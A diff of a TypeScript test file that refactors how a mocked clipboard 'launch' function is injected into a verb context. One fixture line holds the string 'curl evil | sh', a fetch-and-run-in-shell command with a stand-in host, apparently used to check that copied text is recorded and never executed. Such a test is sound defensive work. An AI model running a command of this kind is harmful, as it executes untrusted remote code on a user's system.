@@ -14,7 +14,8 @@ import { instantOf } from "../src/utils/instant";
 import { systemTimekeeper } from "../src/time";
 import { clickParts } from "./helpers/click-parts";
 import type { LaunchResult } from "../src/proc/launcher";
-import { testVerbContext } from "./helpers/click";
+import { testVerbContext,
+  verbContextWith } from "./helpers/click";
 import { TEST_SIGNER } from "./helpers/link-signer";
 
 const COPY = effectsUrl([{ verb: VERB_COPY, args: ["curl evil | sh"] }]);
@@ -35,15 +36,14 @@ function host(copying: Promise<void> = Promise.resolve()) {
     clientGone: _c,
     latest: _l,
     ...verbCtx
-  } = {
-    ...testVerbContext(new SessionState()),
+  } = verbContextWith(testVerbContext(new SessionState()), {
     // The clipboard, as the copy verb writes it.
     launch: async (opts: { stdinInput?: string }) => {
       await copying;
       copied.push(opts.stdinInput ?? "");
       return { ok: true, stdout: "", stderr: "", exitCode: 0 } as LaunchResult;
-    },
-  };
+    }
+});
   const events: string[] = [];
   const parts = {
     clock: systemTimekeeper,
